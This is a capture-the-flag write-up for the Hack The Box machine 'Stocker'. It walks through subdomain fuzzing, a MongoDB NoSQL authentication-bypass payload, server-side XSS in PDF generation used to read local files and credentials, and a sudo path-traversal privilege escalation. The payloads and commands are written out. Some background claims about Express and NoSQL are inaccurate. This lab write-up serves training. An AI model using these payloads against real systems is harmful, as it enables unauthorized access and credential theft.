## Enumeration

### nmap

nmap shows us two open ports 22,80

### wfuzz

```shell 
wfuzz -c -t 50 -u http://stocker.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.stocker.htb" --hc 301
```

or

### gobuster

```shell
gobuster vhost -u http://stocker.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --append-domain
```



## dev.stocker.htb - Express Mongo NoSQL

We start by capturing a login request in burpsquite.

This server is using Express. Express servers use MongoDB, a popular NoSQL language that is more performance oriented and has improved security because it elimated the SQL language and relys on a structured querty language like dictionaries that is found in JSON or java or python. 

[This goes over the exploitation process more in depth.](https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb)

We can use a json authentication bypass from [payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#authentication-bypass). 

We can set the content-type to application/json and use this json payload to access `/stock`

```shell
{"username": {"$ne": null}, "password": {"$ne": null}}
```

### LFI 

Adding stock and capturing the add to cart request in the burp suite proxy that this uses more json to create the pdf. We can modify the json and [perform service side xss](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf).

![Dynamic Server side XSS](/assets/stocker03.png)

We pick up a few users here:

```shell
mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

Lets try to read some more files. This server is running Express and NodeJS, and our webserver can be assumed to running at `/var/www/dev` we can read index.js with our LFI and get DB credentials.

We can use these credentials to login to the ssh via angoose.

## system 

![Pick up the first flag](/assets/stocker05.png)

Pretty easy to [pwn the machine](https://www.hackthebox.com/achievement/machine/1096692/523) from here. `sudo -l` 

```shell
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

There is a `tst.js` in the users home that will read roots flag. We can use directory traversal to get the final flag.

```shell
sudo /usr/bin/node /usr/local/scripts/../../../../home/angoose/tst.js
```

This box took me weeks to finish. I am currently trying to focus on my weaknesses which are exploiting the many different underlying web technologies.
